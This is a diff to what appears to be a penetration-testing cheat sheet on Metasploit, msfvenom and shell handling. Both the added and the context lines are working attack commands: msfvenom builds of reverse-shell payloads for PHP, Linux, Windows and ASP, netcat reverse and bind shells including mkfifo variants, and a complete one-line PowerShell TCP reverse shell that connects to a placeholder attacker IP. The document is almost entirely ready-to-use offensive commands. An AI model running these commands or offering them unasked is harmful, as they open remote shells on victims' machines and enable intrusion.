@@ -337,7 +337,7 @@ server service:	Set the server address and service to attack <br>
 ### Set/unset global parameter:
     setg/unsetg PARAMETER VALUE
 ### Launch exploit: 
-    exploit/run (-z to launch it in the background, or CTRL+Z)
+    exploit/run (-z to launch it in the background, or CTRL+Z or -j)
 ### Check if target is exploitable without running the exploit:
     check
 ### Change payload:
@@ -369,12 +369,18 @@ Once a vulnerability has been successfully exploited, a session will be created.
 ### Search through services: 
     services -S <service>
 ## Msfvenom
+payload are stored as followed: <OS>/<arch>/<payload> (/ if staged or _ if not staged for shell/reverse or shell_reverse) <br>
+### List all payloads:
+    msfvenom --list payloads
 ### php payload:
     msfvenom -p php/reverse_php LHOST=<attacker ip> LPORT=XXXX -f raw > reverse_shell.php
 ### Linux ELF reverse_shell
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT=XXXX -f elf > rev_shell.elf
 ### Windows reverse_shell
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT=XXXX -f exe > rev_shell.exe
+Without meterpreter:
+
+    msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
 ### ASP reverse_shell
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
 ### Python reverse_shell
@@ -445,6 +451,9 @@ hashdump: Dumps the contents of the SAM database <br>
     nc <LOCAL-IP> <PORT> -e /bin/bash (reverse)
     nc -lvnp <port> -e "cmd.exe" (bind)
     mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (on new Linux without -e on nc, then attacker binds to it)
+    mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (same as above, then attacker listen to it)
+### Send a shell from recent Windows server:
+    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ### Shell stabilisation
 #### Python:
     python -c 'import pty;pty.spawn("/bin/bash")'
